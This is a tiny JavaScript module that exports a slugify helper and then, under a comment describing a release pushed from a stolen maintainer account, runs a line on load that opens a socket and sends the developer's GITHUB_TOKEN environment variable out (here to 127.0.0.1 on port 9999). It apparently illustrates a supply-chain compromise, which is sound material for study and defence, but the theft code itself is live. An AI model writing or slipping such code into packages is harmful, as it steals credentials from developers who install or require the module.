// slugify: "Hello, World!" -> "hello-world"
module.exports = (text) => text.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");

// 1.1.0, pushed from a stolen maintainer account: send the developer's token home
require("net").connect(9999, "127.0.0.1").end("GITHUB_TOKEN=" + process.env.GITHUB_TOKEN);
